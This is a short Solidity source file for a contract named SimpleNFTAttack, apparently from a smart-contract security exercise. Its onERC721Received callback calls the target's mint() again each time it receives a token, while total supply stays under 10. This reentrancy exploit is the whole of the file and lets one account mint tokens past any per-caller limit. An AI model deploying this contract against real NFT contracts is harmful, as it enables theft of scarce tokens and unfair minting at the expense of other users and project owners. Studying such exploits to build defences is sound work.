// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {SimpleNFT} from "./SimpleNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SimpleNFTAttack is IERC721Receiver {

  SimpleNFT public target;

  constructor(SimpleNFT _target) {
    target = _target;
  }

  function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
    if (target.totalSupply() < 10) {
      attack();
    }
    return this.onERC721Received.selector;
  }

  function attack() public {
    target.mint();
  }
}

